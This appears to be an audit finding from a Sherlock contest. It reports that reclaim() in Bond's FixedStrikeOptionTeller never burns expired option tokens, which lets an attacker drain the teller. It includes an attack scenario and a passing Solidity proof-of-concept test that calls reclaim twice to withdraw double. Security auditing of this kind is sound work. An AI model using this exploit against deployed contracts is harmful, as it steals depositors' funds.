@@ -1,0 +1,92 @@
+# [H] Malicious users could empty teller quote/payout tokens by repeatedly reclaim expired option token
+
+## Summary
+Severity: High
+Reporter: tvdung94
+Source: https://github.com/sherlock-audit/2023-06-bond/blob/main/options/src/fixed-strike/FixedStrikeOptionTeller.sol#L395-L437
+Type: audit-issue
+
+## Details
+# Malicious users could empty teller quote/payout tokens by repeatedly reclaim expired option token
+
+## Summary
+Malicious receivers could empty teller quote/payout tokens by repeatedly reclaim expired option token.
+## Vulnerability Detail
+When the option tokens expire, receivers can reclaim funds via reclaim(). However, in reclaim(), expired tokens are not burned after being reclaimed, so receivers can just reclaim funds as many times as they wish, draining tokens in the teller's balance. 
+
+Attack scenario:
+- Bob (attacker) sees a good option with lots of people minting its option token.
+- Bob deploys his own option (bobOptionToken) with same quote/payout token settings as the option above, with preferably  shorter expiry.
+- Bob mints some bobOptionToken to make sure that bobOptionToken.totalSupply() is not 0.
+- After bobOptionToken's expiry, Bob can just abuse reclaim() to withdraw quote/payout token as many times as he wishes.
+
+## Impact
+Malicious receivers can steal all teller's funds.
+## Code Snippet
+https://github.com/sherlock-audit/2023-06-bond/blob/main/options/src/fixed-strike/FixedStrikeOptionTeller.sol#L395-L437
+
+Test: 
+```solidity
+function test_steal_reclaim_call() public {
+        //console2.log("ALICE  balance before: ", abc.balanceOf(address(alice)));
+        //console2.log("BOB    balance before: ", abc.balanceOf(address(bob)));
+        //console2.log("TELLER balance before: ", abc.balanceOf(address(teller)));
+        //console2.log();
+        // Deploy call option token
+        uint256 strikePrice = 5 * 10 ** def.decimals();
+        FixedStrikeOptionToken optionToken = teller.deploy(
+            abc, // ERC20 payoutToken
+            def, // ERC20 quoteToken
+            uint48(0), // uint48 eligible (timestamp) - today
+            uint48(block.timestamp + 8 days), // uint48 expiry (timestamp) - 20220109
+            alice, // address receiver
+            true, // bool call (true) or put (false)
+            strikePrice // uint256 strikePrice
+        );
+
+        // Mint option tokens by depositing collateral (payout tokens)
+        uint256 amount = 100 * 10 ** abc.decimals();
+        vm.prank(alice);
+        teller.create(optionToken, amount);
+
+        vm.startPrank(bob);
+        FixedStrikeOptionToken optionTokenBob = teller.deploy(
+            abc, // ERC20 payoutToken
+            def, // ERC20 quoteToken
+            uint48(0), // uint48 eligible (timestamp) - today
+            uint48(block.timestamp + 8 days), // uint48 expiry (timestamp) - 20220109
+            bob, // address receiver
+            true, // bool call (true) or put (false)
+            strikePrice // uint256 strikePrice
+        );
+        teller.create(optionTokenBob, amount);
+
+        vm.stopPrank();
+
+        // Warp forward past expiry
+        vm.warp(block.timestamp + 9 days);
+
+        uint256 tellerPayoutStart = abc.balanceOf(address(teller));
+
+        vm.startPrank(bob);
+        teller.reclaim(optionTokenBob);
+        teller.reclaim(optionTokenBob);
+        vm.stopPrank();
+
+        // check we withdraw double
+        assertEq(abc.balanceOf(address(teller)), tellerPayoutStart - amount * 2);
+
+        //console2.log("ALICE  balance after: ", abc.balanceOf(address(alice)));
+        //console2.log("BOB    balance after: ", abc.balanceOf(address(bob)));
+        //console2.log("TELLER balance after: ", abc.balanceOf(address(teller)));
+    }
+
+```
+
+[PASS] test_steal_reclaim_call() (gas: 578064)
+## Tool used
+
+Manual Review
+
+## Recommendation
+Burn expired tokens after reclaim.
